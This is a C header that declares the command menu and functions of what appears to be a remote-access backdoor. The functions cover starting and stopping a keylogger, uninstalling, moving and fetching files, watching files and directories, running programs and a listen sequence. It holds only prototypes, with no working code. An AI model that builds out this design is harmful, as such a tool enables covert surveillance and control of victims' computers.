#ifndef MENU_OPTION_H
#define MENU_OPTION_H

#include "fsm.h"
#include <stdio.h>

#define READ_CHUNK 4096

typedef enum
{
    LISTEN,
    DISCONNECT,
    UNINSTALL,
    START_KEYLOG,
    STOP_KEYLOG,
    TRANSFER_FILE_TO,
    GET_FILE,
    WATCH_FILE,
    WATCH_DIR,
    RUN_PROGRAM
} menu_option;

menu_option receive_menu_option(struct ip_info ip_ctx);

int disconnect(struct ip_info ip_ctx);
int uninstall(struct ip_info ip_ctx);
int start_keylogger(struct ip_info ip_ctx);
int stop_keylogger(struct ip_info ip_ctx);
int transfer_file(struct ip_info ip_ctx);
int get_file(struct ip_info ip_ctx);
int watch_file(struct ip_info ip_ctx);
int watch_directory(struct ip_info ip_ctx);
int run_program(struct ip_info ip_ctx);

int listen_sequence(char *final_timestamp, size_t ts_len, char *final_ip);
int run_command_string(const char *cmd, char **output);

#endif // MENU_OPTION_H
